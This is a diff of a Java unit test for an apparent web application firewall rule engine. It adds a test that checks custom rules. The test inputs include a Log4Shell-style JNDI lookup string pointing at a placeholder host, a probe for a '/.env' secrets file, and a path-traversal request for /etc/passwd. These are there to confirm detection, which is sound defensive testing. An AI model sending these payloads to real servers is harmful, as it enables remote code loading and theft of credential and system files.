@@ -22,7 +22,7 @@ class EngineTest {
     static void load() throws Exception {
         try (var stream = EngineTest.class.getResourceAsStream("/telvyn/waf-rules.json")) {
             assertNotNull(stream);
-            engine = Engine.load(new Gson().fromJson(new InputStreamReader(stream, StandardCharsets.UTF_8), Map.class));
+            engine = Engine.load(new Gson().fromJson(new InputStreamReader(stream, StandardCharsets.UTF_8), Map.class), 2);
         }
     }
 
@@ -50,6 +50,18 @@ class EngineTest {
         var result = run(Map.of("server.request.query", Map.of("q", List.of("../../etc/passwd"))));
         assertEquals("match", result.outcome());
         assertFalse(new Gson().toJson(result.events()).contains("passwd"));
+    }
+
+    @Test
+    void regrasProprias() {
+        Map<String, Object> log4j = Map.of("server.request.headers.no_cookies", Map.of("x-api", "${jndi:ldap://x.example/a}"));
+        assertTrue(String.valueOf(run(log4j).events()).contains("tlv-000-111"));
+        var scan = engine.open();
+        scan.run(Map.of("server.request.path", "/.env"), LIMITS, 200_000, false);
+        assertTrue(String.valueOf(scan.run(Map.of("server.response.status", "404"), LIMITS, 200_000, false).events()).contains("tlv-000-206"));
+        var found = engine.open();
+        found.run(Map.of("server.request.path", "/.env"), LIMITS, 200_000, false);
+        assertEquals("ok", found.run(Map.of("server.response.status", "200"), LIMITS, 200_000, false).outcome());
     }
 
     @Test
